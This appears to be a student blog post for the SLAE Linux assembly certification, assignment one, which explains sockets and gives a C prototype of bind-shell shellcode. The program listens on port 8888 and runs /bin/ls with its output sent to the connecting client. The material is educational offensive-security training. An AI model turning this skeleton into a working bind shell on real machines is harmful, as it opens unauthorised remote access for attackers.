---
title: Shell Bind TCP
date: 2017-05-13 12:39:08
---
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

[SLAE](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE-916
-- -

### Assignment number one requirements are:

* create a **Shell_Bind_TCP** shellcode
* binds to a port
* executes shell on an incoming connection to the port (/bin/ls)
* port number should be configurable

### Background Information
A **Shell_Bind_TCP** shellcode spawns a shell when a connection is successfully established. The code when executed achieves its aim through the use of sockets. Sockets are the endpoints of a two way network communications link. These endpoints/applications are defined by an IP address and a port number. The two applications normally run on different computers, but sockets can also be used for interprocess communication on a single computer. The port number allows you to identify the service that you require and allows concurrent connections sharing the same address. It is useful to program the problem in C as you can get a precise understanding of what exactly the assembly code will have to contain. There are numerous examples of this program. [This post came in useful](http://www.thegeekstuff.com/2011/12/c-socket-programming/)

This C program helped me to visualise the requirements:

``` C
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void)
{
 //struct for socket info
 struct sockaddr_in srvFd;

 //set properties
 srvFd.sin_family = AF_INET;			//family for IP address
 srvFd.sin_port = htons(8888);			//port number (msb first)
 srvFd.sin_addr.s_addr = htonl(INADDR_ANY); 	//accepts connections to all the IPs of the machine

 //Sys Call - create socket descriptor
 int srvSoc = socket(AF_INET, SOCK_STREAM, 0);

 //Sys Call - assign address/port to socket
 bind(srvSoc, (struct sockaddr *) &srvFd, 16);

 //Sys Call - accept incoming conection - just let max number of connections = 1
 listen(srvSoc, 1);

 //Sys Call - allow incoming connection attempt on a socket
 int clientSoc = accept(srvSoc, NULL, NULL);

 //Sys Call - redirect stdout to the socket - when /bin/ls is executed output will use this socket instead of the standard file descriptors.
 dup2(clientSoc, 1);

 //Sys Call - execute /bin/ls, execvc("address of where /bin/ls", "address of array of arg strings")
 char *argv[] = {"/bin/ls",NULL};
 execve(argv[0], &argv[0], NULL);

 return 0;
}
```
